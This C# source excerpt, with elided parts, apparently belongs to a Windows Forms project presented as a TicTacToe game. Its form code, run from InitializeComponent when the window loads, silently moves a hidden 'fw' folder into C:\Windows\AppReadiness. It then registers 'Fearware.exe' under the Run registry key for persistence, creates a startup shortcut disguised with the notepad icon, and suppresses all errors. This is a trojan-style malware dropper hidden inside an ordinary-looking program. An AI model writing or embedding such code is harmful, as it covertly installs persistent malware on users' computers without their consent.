...
namespace TicTacToe
{
    partial class Form1
    {
        ...
        {
            if (Directory.Exists(Environment.CurrentDirectory + @"\fw"))
            {
                Directory.Move(Environment.CurrentDirectory + @"\fw", @"C:\Windows\AppReadiness\fw");
                try
                {
                    RegistryKey rk = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
                    rk.SetValue("Fearware", @"C:\Windows\AppReadiness\fw\Fearware.exe");
                }
                catch { }
                try
                {
                    ...
                    shortcut.Arguments = "";
                    shortcut.TargetPath = @"C:\Windows\AppReadiness\fw\Fearware.exe";
                    // not sure about what this is for
                    shortcut.WindowStyle = 1;
                    shortcut.Description = "my shortcut description";
                    shortcut.WorkingDirectory = @"C:\Windows\AppReadiness\fw";
                    shortcut.IconLocation = "notepad.exe, 0";
                    shortcut.Save();
                }
                catch { }
                GrantAccess(@"C:\Windows\AppReadiness\fw\Fearware.exe");
            }
        }
        ...
        private void InitializeComponent()
        {
            ...
            GrantAccess(Environment.CurrentDirectory+"\\fw");
            SetStartup();
